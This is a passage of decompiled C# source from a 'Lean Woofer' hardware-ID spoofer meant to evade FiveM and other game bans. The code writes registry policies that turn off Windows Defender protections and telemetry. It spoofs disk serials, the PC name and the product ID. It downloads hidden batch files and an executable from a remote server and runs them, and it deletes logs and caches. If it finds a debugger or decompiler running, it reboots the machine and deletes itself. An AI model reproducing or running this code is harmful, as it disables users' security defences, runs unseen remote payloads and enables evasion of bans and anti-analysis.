			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			Main.HWIDclick();
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill /f /im Steam.exe /t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
				streamWriter.WriteLine("cls");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Spoofed Windows Info!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00007408 File Offset: 0x00005608
		public static string RandomId(int length)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			string text2 = "";
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				text2 += text[random.Next(text.Length)].ToString();
			}
			return text2;
		}

		// Token: 0x06000065 RID: 101 RVA: 0x0000745C File Offset: 0x0000565C
		public static void Disk()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + str, true).SetValue("Identifier", Main.RandomId(8) + "-" + Main.RandomId(8) + "-A");
			}
		}

		// Token: 0x06000066 RID: 102 RVA: 0x000021DB File Offset: 0x000003DB
		private void ak(object sender, EventArgs e)
		{
			Main.Disk();
			MessageBox.Show("Spoofed Disk!", "Lean Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x06000067 RID: 103 RVA: 0x000075F8 File Offset: 0x000057F8
		public static string GenerateString(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "ABCDEF0123456789"[Main.random.Next("ABCDEF0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00007644 File Offset: 0x00005844
		private void al(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("033856");
			File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
			File.SetAttributes(tempPath + this.c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.c + ".bat");
			Thread.Sleep(2500);
			this.xynwbyzia();
			MessageBox.Show("Spoofed Xbox!", "Lean Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x06000069 RID: 105 RVA: 0x000076D0 File Offset: 0x000058D0
		public static void SpoofPCName()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
			registryKey.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x0600006A RID: 106 RVA: 0x0000771C File Offset: 0x0000591C
		private void am(object sender, EventArgs e)
		{
			Main.SpoofPCName();
			DialogResult dialogResult = MessageBox.Show("Name Spoofed, Do you want to restart your PC Now?", "Lean Woofer", MessageBoxButtons.YesNo);
			if (dialogResult == DialogResult.Yes)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00007770 File Offset: 0x00005970
		private static void an()
		{
			try
			{
				Process process = new Process();
				process.StartInfo.Arguments = "netsh advfirewall firewall delete rule name = fivem_b2545_gtaprocess.exe";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
				MessageBox.Show("Enabled");
			}
			catch
			{
				MessageBox.Show("There was an error, try again later", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600006C RID: 108 RVA: 0x000077F8 File Offset: 0x000059F8
		private void ao(object sender, EventArgs e)
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			MessageBox.Show("PrID Changed To: " + Main.CurrentProductID(), "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00007898 File Offset: 0x00005A98
		public static string CurrentProductID()
		{
			string text = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
			string text2 = "ProductID";
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(text))
				{
					if (registryKey2 == null)
					{
						throw new KeyNotFoundException(string.Format("Key Not Found: {0}", text));
					}
					object value = registryKey2.GetValue(text2);
					if (value == null)
					{
						throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", text2));
					}
					result = value.ToString();
				}
			}
			return result;
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00002198 File Offset: 0x00000398
		private void ap(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00002198 File Offset: 0x00000398
		private void aq(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000021F3 File Offset: 0x000003F3
		private void ar(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/unban");
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00002198 File Offset: 0x00000398
		private void @as(object sender, EventArgs e)
		{
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00007948 File Offset: 0x00005B48
		public static void InstallDate()
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00002200 File Offset: 0x00000400
		private void at(object sender, EventArgs e)
		{
			Main.InstallDate();
			MessageBox.Show("Spoofed Last Logs ", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00007984 File Offset: 0x00005B84
		private static void au()
		{
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName2 = Process.GetProcessesByName("ida64");
			if (processesByName2.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName3 = Process.GetProcessesByName("64dbg");
			if (processesByName3.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName4 = Process.GetProcessesByName("ollydbg");
			if (processesByName4.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName5 = Process.GetProcessesByName("x32dbg");
			if (processesByName5.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName6 = Process.GetProcessesByName("MasterDumper");
			if (processesByName6.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00007BB8 File Offset: 0x00005DB8
		private void av(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text = this.bm.Text;
			string path = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text2 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.d.Add(process);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			else
			{
				byte[] bytes = Login.KeyAuthApp.download("558460");
				File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes);
				File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
				Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
				Thread.Sleep(500);
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00002198 File Offset: 0x00000398
		private void aw(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00007E14 File Offset: 0x00006014
		private void ax(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("918086");
			File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
			File.SetAttributes(tempPath + this.c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.c + ".bat");
			Thread.Sleep(2500);
			this.xynwbyzia();
			MessageBox.Show("Unlinked All Services!", "Lean Woofer Premium", MessageBoxButtons.OK);
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00007EA0 File Offset: 0x000060A0
		private void ay(object sender, EventArgs e)
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + str, true).SetValue("Identifier", Main.RandomId(8) + "-" + Main.RandomId(8) + "-A");
			}
			MessageBox.Show("Spoofed Nvme Disk!", "Lean Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x06000079 RID: 121 RVA: 0x0000221A File Offset: 0x0000041A
		private void az(object sender, EventArgs e)
		{
			Main.NetWoof();
			Thread.Sleep(2500);
			MessageBox.Show("Spoofed Local netCache!", "Lean Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600007A RID: 122 RVA: 0x0000804C File Offset: 0x0000624C
		private void ba(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("811372");
			File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
			Process.Start(tempPath + this.c + ".bat");
			Thread.Sleep(2500);
			this.xynwbyzia();
			Main.NetWoof();
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text = this.bm.Text;
			string path = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text2 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.d.Add(process);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			else
			{
				byte[] bytes2 = Login.KeyAuthApp.download("558460");
				File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
				Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
				Thread.Sleep(500);
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			Main.HWIDclick();
			string tempPath2 = Path.GetTempPath();
			byte[] bytes3 = Login.KeyAuthApp.download("061044");
			File.WriteAllBytes(tempPath2 + this.c + ".bat", bytes3);
			File.SetAttributes(tempPath2 + this.c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath2 + this.c + ".bat");
			Thread.Sleep(2500);
			this.xynwbyzia();
			string path2 = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text4 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine("netsh int ip reset");
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.d.Add(process3);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process3.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
			Thread.Sleep(2000);
			MessageBox.Show("Spoofed FiveM Server Bans, Use new steam, rockstar and unlink discord (might need a vpn)", "Lean Woofer Premium", MessageBoxButtons.OK);
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0000223C File Offset: 0x0000043C
		private void bb(object sender, EventArgs e)
		{
			this.ba.BringToFront();
		}

